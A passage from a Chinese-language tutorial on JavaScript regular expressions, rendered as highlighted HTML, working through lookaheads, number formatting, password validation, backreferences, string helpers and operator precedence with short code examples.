console<span>.</span><span>log</span><span>(</span>result<span>)</span>
<span>// => "he#l#lo"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div></li>
<li>
<p>而 (?!p) 就是 (?=p) 的反面意思。</p>
<div><pre><code><span>var</span> result <span>=</span> <span>'hello'</span><span>.</span><span>replace</span><span>(</span><span><span>/</span><span>(?!l)</span><span>/</span><span>g</span></span><span>,</span> <span>'#'</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>result<span>)</span>
<span>// => "#h#ell#o#"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div></li>
</ul>
<h2 id="_6-正则表达式括号的作用-相关案例"> 6. 正则表达式括号的作用 - 相关案例</h2>
<ul>
<li>
<p>不匹配任何东西的正则。</p>
<blockquote>
<p>因为此正则要求只有一个字符，但该字符后面是开头，而这样的字符串是不存在的。</p>
</blockquote>
<div><pre><code><span>var</span> regex <span>=</span> <span><span>/</span><span>.^</span><span>/</span></span>
</code></pre>
<div><span>1</span><br></div></div></li>
<li>
<p>数字的千位分隔符表示法。</p>
<blockquote>
<p>把 &quot;12345678&quot;，变成 &quot;12,345,678&quot;。</p>
</blockquote>
<div><pre><code><span>var</span> regex <span>=</span> <span><span>/</span><span>(?!^)(?=(\d{3})+$)</span><span>/</span><span>g</span></span>
<span>var</span> result <span>=</span> <span>'12345678'</span><span>.</span><span>replace</span><span>(</span>regex<span>,</span> <span>','</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>result<span>)</span>
<span>// => "12,345,678"</span>
result <span>=</span> <span>'123456789'</span><span>.</span><span>replace</span><span>(</span>regex<span>,</span> <span>','</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>result<span>)</span>
<span>// => "123,456,789"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><blockquote>
<p>把 &quot;12345678 123456789&quot; 替换成 &quot;12,345,678 123,456,789&quot;。</p>
</blockquote>
<div><pre><code><span>var</span> string <span>=</span> <span>'12345678 123456789'</span><span>,</span>
  regex <span>=</span> <span><span>/</span><span>\B(?=(\d{3})+\b)</span><span>/</span><span>g</span></span>
<span>var</span> result <span>=</span> string<span>.</span><span>replace</span><span>(</span>regex<span>,</span> <span>','</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>result<span>)</span>
<span>// => "12,345,678 123,456,789"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><blockquote>
<p>1888 格式化成 $ 1888.00。</p>
</blockquote>
<div><pre><code><span>function</span> <span>format</span><span>(</span><span>num</span><span>)</span> <span>{</span>
  <span>return</span> num
    <span>.</span><span>toFixed</span><span>(</span><span>2</span><span>)</span>
    <span>.</span><span>replace</span><span>(</span><span><span>/</span><span>\B(?=(\d{3})+\b)</span><span>/</span><span>g</span></span><span>,</span> <span>','</span><span>)</span>
    <span>.</span><span>replace</span><span>(</span><span><span>/</span><span>^</span><span>/</span></span><span>,</span> <span>'$$ '</span><span>)</span>
<span>}</span>
console<span>.</span><span>log</span><span>(</span><span>format</span><span>(</span><span>1888</span><span>)</span><span>)</span>
<span>// => "$ 1,888.00"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div></li>
<li>
<p>验证密码问题。</p>
<blockquote>
<ul>
<li>要求：密码长度 6-12 位，由数字、小写字符和大写字母组成，但必须至少包括 2 种字符。</li>
<li>下面的正则看起来比较复杂，只要理解了第二步，其余就全部理解了。/(?=.<em>[0-9])<sup></sup>{6,12}$/对于这个正则，我们只需要弄明白 (?=.</em>[0-9])^ 即可。分开来看就是 (?=.<em>[0-9]) 和 ^。表示开头前面还有个位置（当然也是开头，即同一个位置，想想之前的空字符类比）。(?=.</em>[0-9]) 表示该位置后面的字符匹配 .*[0-9]，即，有任何多个任意字符，后面再跟个数字。翻译成大白话，就是接下来的字符，必须包含个数字。</li>
</ul>
</blockquote>
<div><pre><code><span>var</span> regex <span>=</span> <span>/</span><span>(</span><span>(</span><span>?</span><span>=</span><span>.</span><span>*</span><span>[</span><span>0</span><span>-</span><span>9</span><span>]</span><span>)</span><span>(</span><span>?</span><span>=</span><span>.</span><span>*</span><span>[</span>a<span>-</span>z<span>]</span><span>)</span><span>|</span><span>(</span><span>?</span><span>=</span><span>.</span><span>*</span><span>[</span><span>0</span><span>-</span><span>9</span><span>]</span><span>)</span><span>(</span><span>?</span><span>=</span><span>.</span><span>*</span><span>[</span><span>A</span><span>-</span><span>Z</span><span>]</span><span>)</span><span>|</span><span>(</span><span>?</span><span>=</span><span>.</span><span>*</span><span>[</span>a<span>-</span>z<span>]</span><span>)</span><span>(</span><span>?</span><span>=</span><span>.</span><span>*</span><span>[</span><span>A</span><span>-</span>
<span>Z</span><span>]</span><span>)</span><span>)</span><span>^</span><span>[</span><span>0</span><span>-</span>9A<span>-</span>Za<span>-</span>z<span>]</span><span>{</span><span>6</span><span>,</span><span>12</span><span>}</span>$<span>/</span><span>;</span>
console<span>.</span><span>log</span><span>(</span> regex<span>.</span><span>test</span><span>(</span><span>"1234567"</span><span>)</span> <span>)</span><span>;</span> <span>// false 全是数字</span>
console<span>.</span><span>log</span><span>(</span> regex<span>.</span><span>test</span><span>(</span><span>"abcdef"</span><span>)</span> <span>)</span><span>;</span> <span>// false 全是小写字母</span>
console<span>.</span><span>log</span><span>(</span> regex<span>.</span><span>test</span><span>(</span><span>"ABCDEFGH"</span><span>)</span> <span>)</span><span>;</span> <span>// false 全是大写字母</span>
console<span>.</span><span>log</span><span>(</span> regex<span>.</span><span>test</span><span>(</span><span>"ab23C"</span><span>)</span> <span>)</span><span>;</span> <span>// false 不足6位</span>
console<span>.</span><span>log</span><span>(</span> regex<span>.</span><span>test</span><span>(</span><span>"ABCDEF234"</span><span>)</span> <span>)</span><span>;</span> <span>// true 大写字母和数字</span>
console<span>.</span><span>log</span><span>(</span> regex<span>.</span><span>test</span><span>(</span><span>"abcdEF234"</span><span>)</span> <span>)</span><span>;</span> <span>// true 三者都有</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div><blockquote>
<p>“至少包含两种字符” 的意思就是说，不能全部都是数字，也不能全部都是小写字母，也不能全部都是大写字母。</p>
</blockquote>
<div><pre><code><span>var</span> regex <span>=</span> <span><span>/</span><span>(?!^[0-9]{6,12}$)(?!^[a-z]{6,12}$)(?!^[A-Z]{6,12}$)^[0-9A-Za-z]{6,12}$</span><span>/</span></span>
console<span>.</span><span>log</span><span>(</span>regex<span>.</span><span>test</span><span>(</span><span>'1234567'</span><span>)</span><span>)</span> <span>// false 全是数字</span>
console<span>.</span><span>log</span><span>(</span>regex<span>.</span><span>test</span><span>(</span><span>'abcdef'</span><span>)</span><span>)</span> <span>// false 全是小写字母</span>
console<span>.</span><span>log</span><span>(</span>regex<span>.</span><span>test</span><span>(</span><span>'ABCDEFGH'</span><span>)</span><span>)</span> <span>// false 全是大写字母</span>
console<span>.</span><span>log</span><span>(</span>regex<span>.</span><span>test</span><span>(</span><span>'ab23C'</span><span>)</span><span>)</span> <span>// false 不足6位</span>
console<span>.</span><span>log</span><span>(</span>regex<span>.</span><span>test</span><span>(</span><span>'ABCDEF234'</span><span>)</span><span>)</span> <span>// true 大写字母和数字</span>
console<span>.</span><span>log</span><span>(</span>regex<span>.</span><span>test</span><span>(</span><span>'abcdEF234'</span><span>)</span><span>)</span> <span>// true 三者都有</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div></li>
</ul>
<h2 id="_7-分组引用"> 7. 分组引用</h2>
<ul>
<li>
<p>提取数据。</p>
<blockquote>
<p>提取出年、月、日。</p>
</blockquote>
<div><pre><code><span>var</span> regex <span>=</span> <span><span>/</span><span>(\d{4})-(\d{2})-(\d{2})</span><span>/</span></span>
<span>var</span> string <span>=</span> <span>'2017-06-12'</span>
regex<span>.</span><span>test</span><span>(</span>string<span>)</span> <span>// 正则操作即可，例如</span>
<span>//regex.exec(string);</span>
<span>//string.match(regex);</span>
console<span>.</span><span>log</span><span>(</span>RegExp<span>.</span>$1<span>)</span> <span>// "2017"</span>
console<span>.</span><span>log</span><span>(</span>RegExp<span>.</span>$2<span>)</span> <span>// "06"</span>
console<span>.</span><span>log</span><span>(</span>RegExp<span>.</span>$3<span>)</span> <span>// "12"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div></li>
<li>
<p>替换。</p>
<blockquote>
<p>把 yyyy-mm-dd 格式，替换成 mm/dd/yyyy。</p>
</blockquote>
<div><pre><code><span>var</span> regex <span>=</span> <span><span>/</span><span>(\d{4})-(\d{2})-(\d{2})</span><span>/</span></span>
<span>var</span> string <span>=</span> <span>'2017-06-12'</span>
<span>var</span> result <span>=</span> string<span>.</span><span>replace</span><span>(</span>regex<span>,</span> <span>'$2/$3/$1'</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>result<span>)</span>
<span>// => "06/12/2017"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div></li>
</ul>
<h2 id="_8-反向引用"> 8. 反向引用</h2>
<ul>
<li>
<p>要写一个正则支持匹配如下三种格式。</p>
<blockquote>
<ul>
<li>要求：2016-06-12、2016/06/12、2016.06.12。</li>
<li>注意里面的 \1，表示的引用之前的那个分组 (-|/|.)。不管它匹配到什么（比如 -），\1 都匹配那个同样的具体某个字符。</li>
</ul>
</blockquote>
<div><pre><code><span>var</span> regex <span>=</span> <span><span>/</span><span>\d{4}(-|\/|\.)\d{2}\1\d{2}</span><span>/</span></span>
<span>var</span> string1 <span>=</span> <span>'2017-06-12'</span>
<span>var</span> string2 <span>=</span> <span>'2017/06/12'</span>
<span>var</span> string3 <span>=</span> <span>'2017.06.12'</span>
<span>var</span> string4 <span>=</span> <span>'2016-06/12'</span>
console<span>.</span><span>log</span><span>(</span>regex<span>.</span><span>test</span><span>(</span>string1<span>)</span><span>)</span> <span>// true</span>
console<span>.</span><span>log</span><span>(</span>regex<span>.</span><span>test</span><span>(</span>string2<span>)</span><span>)</span> <span>// true</span>
console<span>.</span><span>log</span><span>(</span>regex<span>.</span><span>test</span><span>(</span>string3<span>)</span><span>)</span> <span>// true</span>
console<span>.</span><span>log</span><span>(</span>regex<span>.</span><span>test</span><span>(</span>string4<span>)</span><span>)</span> <span>// false</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div></li>
<li>
<p>\10 表示什么呢？</p>
<blockquote>
<ul>
<li>另外一个疑问可能是，即 \10 是表示第 10 个分组，还是 \1 和 0 呢？</li>
<li>答案是前者，虽然一个正则里出现 \10 比较罕见。</li>
</ul>
</blockquote>
<div><pre><code><span>var</span> regex <span>=</span> <span><span>/</span><span>(1)(2)(3)(4)(5)(6)(7)(8)(9)(#) \10+</span><span>/</span></span>
<span>var</span> string <span>=</span> <span>'123456789# ######'</span>
console<span>.</span><span>log</span><span>(</span>regex<span>.</span><span>test</span><span>(</span>string<span>)</span><span>)</span>
<span>// => true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div></li>
<li>
<p>引用不存在的分组会怎样？</p>
<blockquote>
<p>因为反向引用，是引用前面的分组，但我们在正则里引用了不存在的分组时，此时正则不会报错，只是匹配反向引用的字符本身。例如 \2，就匹配 &quot;\2&quot;，注意 &quot;\2&quot; 表示对 &quot;2&quot; 进行了转义。</p>
</blockquote>
<div><pre><code><span>var</span> regex <span>=</span> <span><span>/</span><span>\1\2\3\4\5\6\7\8\9</span><span>/</span></span>
console<span>.</span><span>log</span><span>(</span>regex<span>.</span><span>test</span><span>(</span><span>'\1\2\3\4\5\6\789'</span><span>)</span><span>)</span>
console<span>.</span><span>log</span><span>(</span><span>'\1\2\3\4\5\6\789'</span><span>.</span><span>split</span><span>(</span><span>''</span><span>)</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div></li>
<li>
<p>分组后面有量词会怎样？</p>
<blockquote>
<p>分组后面有量词的话，分组最终捕获到的数据是最后一次的匹配。</p>
</blockquote>
<div><pre><code><span>var</span> regex <span>=</span> <span><span>/</span><span>(\d)+</span><span>/</span></span>
<span>var</span> string <span>=</span> <span>'12345'</span>
console<span>.</span><span>log</span><span>(</span>string<span>.</span><span>match</span><span>(</span>regex<span>)</span><span>)</span>
<span>// => ["12345", "5", index: 0, input: "12345"]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div></li>
<li>
<p>非捕获括号。</p>
<blockquote>
<ul>
<li>之前文中出现的括号，都会捕获它们匹配到的数据，以便后续引用，因此也称它们是捕获型分组和捕获型分支。</li>
<li>如果只想要括号最原始的功能，但不会引用它，即，既不在 API 里引用，也不在正则里反向引用。此时可以使用非捕获括号 (?:p) 和 (?:p1|p2|p3)。</li>
</ul>
</blockquote>
</li>
</ul>
<h2 id="_9-正则表达式位置匹配攻略-相关案例"> 9. 正则表达式位置匹配攻略 - 相关案例</h2>
<ul>
<li>
<p>字符串 trim 方法模拟。</p>
<blockquote>
<p>第一种，匹配到开头和结尾的空白符，然后替换成空字符。</p>
</blockquote>
<div><pre><code><span>function</span> <span>trim</span><span>(</span><span>str</span><span>)</span> <span>{</span>
  <span>return</span> str<span>.</span><span>replace</span><span>(</span><span><span>/</span><span>^\s+|\s+$</span><span>/</span><span>g</span></span><span>,</span> <span>''</span><span>)</span>
<span>}</span>
console<span>.</span><span>log</span><span>(</span><span>trim</span><span>(</span><span>' foobar '</span><span>)</span><span>)</span>
<span>// => "foobar"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><blockquote>
<p>第二种，匹配整个字符串，然后用引用来提取出相应的数据。这里使用了惰性匹配 *?，不然也会匹配最后一个空格之前的所有空格的。当然，前者效率高。</p>
</blockquote>
<div><pre><code><span>function</span> <span>trim</span><span>(</span><span>str</span><span>)</span> <span>{</span>
  <span>return</span> str<span>.</span><span>replace</span><span>(</span><span><span>/</span><span>^\s*(.*?)\s*$</span><span>/</span><span>g</span></span><span>,</span> <span>'$1'</span><span>)</span>
<span>}</span>
console<span>.</span><span>log</span><span>(</span><span>trim</span><span>(</span><span>' foobar '</span><span>)</span><span>)</span>
<span>// => "foobar"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div></li>
<li>
<p>将每个单词的首字母转换为大写。</p>
<blockquote>
<p>思路是找到每个单词的首字母，当然这里不使用非捕获匹配也是可以的。</p>
</blockquote>
<div><pre><code><span>function</span> <span>titleize</span><span>(</span><span>str</span><span>)</span> <span>{</span>
  <span>return</span> str<span>.</span><span>toLowerCase</span><span>(</span><span>)</span><span>.</span><span>replace</span><span>(</span><span><span>/</span><span>(?:^|\s)\w</span><span>/</span><span>g</span></span><span>,</span> <span>function</span><span>(</span><span>c</span><span>)</span> <span>{</span>
    <span>return</span> c<span>.</span><span>toUpperCase</span><span>(</span><span>)</span>
  <span>}</span><span>)</span>
<span>}</span>
console<span>.</span><span>log</span><span>(</span><span>titleize</span><span>(</span><span>'my name is epeli'</span><span>)</span><span>)</span>
<span>// => "My Name Is Epeli"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div></li>
<li>
<p>驼峰化。</p>
<blockquote>
<p>其中分组 (.) 表示首字母，单词的界定是，前面的字符可以是多个连字符、下划线以及空白符。正则后面的 ? 的目的，是为了应对 str 尾部的字符可能不是单词字符，比如 str 是 '-moz-transform '。</p>
</blockquote>
<div><pre><code><span>function</span> <span>camelize</span><span>(</span><span>str</span><span>)</span> <span>{</span>
  <span>return</span> str<span>.</span><span>replace</span><span>(</span><span><span>/</span><span>[-_\s]+(.)?</span><span>/</span><span>g</span></span><span>,</span> <span>function</span><span>(</span><span>match<span>,</span> c</span><span>)</span> <span>{</span>
    <span>return</span> c <span>?</span> c<span>.</span><span>toUpperCase</span><span>(</span><span>)</span> <span>:</span> <span>''</span>
  <span>}</span><span>)</span>
<span>}</span>
console<span>.</span><span>log</span><span>(</span><span>camelize</span><span>(</span><span>'-moz-transform'</span><span>)</span><span>)</span>
<span>// => "MozTransform"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div></li>
<li>
<p>中划线化。</p>
<blockquote>
<p>驼峰化的逆过程。</p>
</blockquote>
<div><pre><code><span>function</span> <span>dasherize</span><span>(</span><span>str</span><span>)</span> <span>{</span>
  <span>return</span> str
    <span>.</span><span>replace</span><span>(</span><span><span>/</span><span>([A-Z])</span><span>/</span><span>g</span></span><span>,</span> <span>'-$1'</span><span>)</span>
    <span>.</span><span>replace</span><span>(</span><span><span>/</span><span>[-_\s]+</span><span>/</span><span>g</span></span><span>,</span> <span>'-'</span><span>)</span>
    <span>.</span><span>toLowerCase</span><span>(</span><span>)</span>
<span>}</span>
console<span>.</span><span>log</span><span>(</span><span>dasherize</span><span>(</span><span>'MozTransform'</span><span>)</span><span>)</span>
<span>// => "-moz-transform"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div></li>
<li>
<p>HTML 转义和反转义。</p>
<blockquote>
<p>其中使用了用构造函数生成的正则，然后替换相应的格式就行了。</p>
</blockquote>
<div><pre><code><span>// 将HTML特殊字符转换成等值的实体</span>
<span>function</span> <span>escapeHTML</span><span>(</span><span>str</span><span>)</span> <span>{</span>
  <span>var</span> escapeChars <span>=</span> <span>{</span>
    <span>'&lt;'</span><span>:</span> <span>'lt'</span><span>,</span>
    <span>'>'</span><span>:</span> <span>'gt'</span><span>,</span>
    <span>'"'</span><span>:</span> <span>'quot'</span><span>,</span>
    <span>'&amp;'</span><span>:</span> <span>'amp'</span><span>,</span>
    <span>"'"</span><span>:</span> <span>'#39'</span><span>,</span>
  <span>}</span>
  <span>return</span> str<span>.</span><span>replace</span><span>(</span>
    <span>new</span> <span>RegExp</span><span>(</span><span>'['</span> <span>+</span> Object<span>.</span><span>keys</span><span>(</span>escapeChars<span>)</span><span>.</span><span>join</span><span>(</span><span>''</span><span>)</span> <span>+</span> <span>']'</span><span>,</span> <span>'g'</span><span>)</span><span>,</span>
    <span>function</span><span>(</span><span>match</span><span>)</span> <span>{</span>
      <span>return</span> <span>'&amp;'</span> <span>+</span> escapeChars<span>[</span>match<span>]</span> <span>+</span> <span>';'</span>
    <span>}</span>
  <span>)</span>
<span>}</span>
console<span>.</span><span>log</span><span>(</span><span>escapeHTML</span><span>(</span><span>'&lt;div>Blah blah blah&lt;/div>'</span><span>)</span><span>)</span>
<span>// => "&amp;lt;div&amp;gt;Blah blah blah&amp;lt;/div&amp;gt";</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div><blockquote>
<p>倒是它的逆过程，使用了括号，以便提供引用。通过 key 获取相应的分组引用，然后作为对象的键。</p>
</blockquote>
<div><pre><code><span>// 实体字符转换为等值的HTML。</span>
<span>function</span> <span>unescapeHTML</span><span>(</span><span>str</span><span>)</span> <span>{</span>
  <span>var</span> htmlEntities <span>=</span> <span>{</span>
    <span>nbsp</span><span>:</span> <span>' '</span><span>,</span>
    <span>lt</span><span>:</span> <span>'&lt;'</span><span>,</span>
    <span>gt</span><span>:</span> <span>'>'</span><span>,</span>
    <span>quot</span><span>:</span> <span>'"'</span><span>,</span>
    <span>amp</span><span>:</span> <span>'&amp;'</span><span>,</span>
    <span>apos</span><span>:</span> <span>"'"</span><span>,</span>
  <span>}</span>
  <span>return</span> str<span>.</span><span>replace</span><span>(</span><span><span>/</span><span>\&amp;([^;]+);</span><span>/</span><span>g</span></span><span>,</span> <span>function</span><span>(</span><span>match<span>,</span> key</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>key <span>in</span> htmlEntities<span>)</span> <span>{</span>
      <span>return</span> htmlEntities<span>[</span>key<span>]</span>
    <span>}</span>
    <span>return</span> match
  <span>}</span><span>)</span>
<span>}</span>
console<span>.</span><span>log</span><span>(</span><span>unescapeHTML</span><span>(</span><span>'&amp;lt;div&amp;gt;Blah blah blah&amp;lt;/div&amp;gt;'</span><span>)</span><span>)</span>
<span>// => "&lt;div>Blah blah blah&lt;/div>"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div></li>
<li>
<p>匹配成对标签。</p>
<blockquote>
<p>匹配一个开标签，可以使用正则 &lt;[^&gt;]+&gt;，匹配一个闭标签，可以使用 &lt;/[^&gt;]+&gt;，但是要求匹配成对标签，那就需要使用反向引用</p>
</blockquote>
<div><pre><code><span>var</span> regex <span>=</span> <span><span>/</span><span>&lt;([^>]+)>[\d\D]*&lt;\/\1></span><span>/</span></span>
<span>var</span> string1 <span>=</span> <span>'&lt;title>regular expression&lt;/title>'</span>
<span>var</span> string2 <span>=</span> <span>'&lt;p>laoyao bye bye&lt;/p>'</span>
<span>var</span> string3 <span>=</span> <span>'&lt;title>wrong!&lt;/p>'</span>
console<span>.</span><span>log</span><span>(</span>regex<span>.</span><span>test</span><span>(</span>string1<span>)</span><span>)</span> <span>// true</span>
console<span>.</span><span>log</span><span>(</span>regex<span>.</span><span>test</span><span>(</span>string2<span>)</span><span>)</span> <span>// true</span>
console<span>.</span><span>log</span><span>(</span>regex<span>.</span><span>test</span><span>(</span>string3<span>)</span><span>)</span> <span>// false</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div></li>
</ul>
<h2 id="_10-正则表达式回溯法原理"> 10. 正则表达式回溯法原理</h2>
<ul>
<li>
<p>其实回溯法，很容易掌握的。简单总结就是，正因为有多种可能，所以要一个一个试。直到，要么到某一步时，整体匹配成功了。要么最后都试完后，发现整体匹配不成功。</p>
</li>
<li>
<p>既然有回溯的过程，那么匹配效率肯定低一些。相对谁呢？相对那些 DFA 引擎, DFA 是 “确定型有限自动机” 的简写。</p>
</li>
<li>
<p>而 JavaScript 的正则引擎是 NFA，NFA 是 “非确定型有限自动机” 的简写。大部分语言中的正则都是 NFA，为啥它这么流行呢？</p>
<blockquote>
<p>答：你别看我匹配慢，但是我编译快啊，而且我还有趣哦。</p>
</blockquote>
</li>
</ul>
<h2 id="_11-结构和操作符"> 11. 结构和操作符</h2>
<table>
<thead>
<tr>
<th>结构</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>字面量</td>
<td>匹配一个具体字符，包括不用转义的和需要转义的。比如 a 匹配字符 &quot;a&quot;，又比如 \n 匹配换行符，又比如 . 匹配小数点</td>
</tr>
<tr>
<td>字符组</td>
<td>匹配一个字符，可以是多种可能之一，比如 [0-9]，表示匹配一个数字，也有 \d 的简写形式，另外还有反义字符组，表示可以是除了特定字符之外任何一个字符，比如 [^0-9]，表示一个非数字字符，也有 \D 的简写形式</td>
</tr>
<tr>
<td>量词</td>
<td>表示一个字符连续出现，比如 a{1,3} 表示 &quot;a&quot; 字符连续出现 3 次。另外还有常见的简写形式，比如 a+ 表示 &quot;a&quot; 字符连续出现至少一次</td>
</tr>
<tr>
<td>锚</td>
<td>匹配一个位置，而不是字符。比如 ^ 匹配字符串的开头，又比如 \b 匹配单词边界，又比如 (?=\d) 表示数字前面的位置</td>
</tr>
<tr>
<td>分组</td>
<td>用括号表示一个整体，比如 (ab)+，表示 &quot;ab&quot; 两个字符连续出现多次，也可以使用非捕获分组 (?:ab)+</td>
</tr>
<tr>
<td>分支</td>
<td>多个子表达式多选一，比如 abc|bcd，表达式匹配 &quot;abc&quot; 或者 &quot;bcd&quot; 字符子串。反向引用，比如 \2，表示引用第 2 个分组</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>操作符描述</th>
<th>操作符</th>
<th>优先级</th>
</tr>
</thead>
<tbody>
<tr>
<td>转义符</td>
<td>\</td>
<td>1</td>
</tr>
<tr>
<td>括号和方括号</td>
<td>(…)、(?:…)、(?=…)、(?!…)、[…]</td>
<td>2</td>
</tr>
<tr>
<td>量词限定符</td>
<td>{m}、{m,n}、{m,}、?、*、+</td>
<td>3</td>
</tr>
<tr>
<td>位置和序列</td>
<td>^、$、\元字符、一般字符</td>
<td>4</td>
</tr>
<tr>
<td>管道符（竖杠）</td>
<td>|</td>
<td>5</td>
</tr>
</tbody>
</table>
<h2 id="_12-正则表达式的拆分-案例分析"> 12. 正则表达式的拆分 - 案例分析</h2>
<ul>
<li>
<p>身份证。</p>
<blockquote>
<ul>
<li>正则表达式是：/^(\d{15}|\d{17}[\dxX])$/。</li>
<li>因为竖杠 | 的优先级最低，所以正则分成了两部分 \d{15} 和 \d{17}[\dxX]。\d{15} 表示 15 位连续数字。\d{17}[\dxX] 表示 17 位连续数字，最后一位可以是数字，可以大小写字母 &quot;x&quot;。</li>
</ul>
</blockquote>
</li>
<li>
<p>IPV4 地址。</p>
<blockquote>
<ul>
<li>正则表达式是：/^((0{0,2}\d|0?\d{2}|1\d{2}|2[0-4]\d|25[0-5]).){3}(0{0,2}\d|0?\d{2}|1\d{2}|2[0-4]\d|25[0-5])$/。</li>
<li>这个正则，看起来非常吓人。但是熟悉优先级后，会立马得出如下的结构：((…).){3}(…)其中，两个 (…) 是一样的结构。表示匹配的是 3 位数字。因此整个结构是 3 位数.3 位数.3 位数.3 位数。</li>
<li>然后再来分析 (…)：(0{0,2}\d|0?\d{2}|1\d{2}|2[0-4]\d|25[0-5])它是一个多选结构，分成 5 个部分：</li>
<li>0{0,2}\d，匹配一位数，包括 &quot;0&quot; 补齐的。比如，&quot;9&quot;、&quot;09&quot;、&quot;009&quot;。</li>
<li>0?\d{2}，匹配两位数，包括 &quot;0&quot; 补齐的，也包括一位数。</li>
<li>1\d{2}，匹配 &quot;100&quot; 到 &quot;199&quot;;</li>
<li>2[0-4]\d，匹配 &quot;200&quot; 到 &quot;249&quot;。</li>
<li>25[0-5]，匹配 &quot;250&quot; 到 &quot;255&quot;</li>
</ul>
</blockquote>
</li>
</ul>
<h2 id="_13-replace-是很强大的"> 13. replace 是很强大的</h2>
<ul>
<li>replace 有两种使用形式，这是因为它的第二个参数，可以是字符串，也可以是函数。当第二个参数是字符串时，如下的字符有特殊的含义。</li>
</ul>
<table>
<thead>
<tr>
<th>属性</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>$1,$2,…,$99</td>
<td>匹配第 1-99 个 分组里捕获的文本</td>
</tr>
<tr>
<td>$&amp;</td>
<td>匹配到的子串文本</td>
</tr>
<tr>
<td>$`</td>
<td>匹配到的子串的左边文</td>
</tr>
<tr>
<td>$'</td>
<td>匹配到的子串的右边文本</td>
</tr>
<tr>
<td>$$</td>
<td>美元符号</td>
</tr>
</tbody>
</table>
<blockquote>
<p>把 &quot;2,3,5&quot;，变成 &quot;5=2+3&quot;。</p>
</blockquote>
<div><pre><code><span>var</span> result <span>=</span> <span>'2,3,5'</span><span>.</span><span>replace</span><span>(</span><span><span>/</span><span>(\d+),(\d+),(\d+)</span><span>/</span></span><span>,</span> <span>'$3=$1+$2'</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>result<span>)</span>
<span>// => "5=2+3"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><blockquote>
<p>把 &quot;2,3,5&quot;，变成 &quot;222,333,555&quot;。</p>
</blockquote>
<div><pre><code><span>var</span> result <span>=</span> <span>'2,3,5'</span><span>.</span><span>replace</span><span>(</span><span><span>/</span><span>(\d+)</span><span>/</span><span>g</span></span><span>,</span> <span>'$&amp;$&amp;$&amp;'</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>result<span>)</span>
<span>// => "222,333,555"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><blockquote>
